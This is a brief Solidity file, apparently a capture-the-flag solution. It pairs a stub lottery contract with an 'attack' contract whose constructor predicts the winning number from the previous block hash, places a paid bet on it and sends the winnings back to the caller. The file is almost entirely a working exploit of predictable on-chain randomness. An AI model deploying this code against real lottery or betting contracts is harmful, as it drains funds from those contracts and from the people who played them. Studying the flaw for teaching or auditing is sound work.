pragma solidity ^0.5.4;


// Lottery using block hash as source of randomness


contract challenge3 {
    function lottery(uint256 n) payable public { }
}

contract attack {
    constructor (challenge3 target) public payable {
        require(msg.value > 0);
        target.lottery.value(msg.value)(uint256(keccak256(abi.encode(blockhash(block.number - 1)))));
        msg.sender.transfer(address(this).balance);
        //selfdestruct(msg.sender);
    }
}
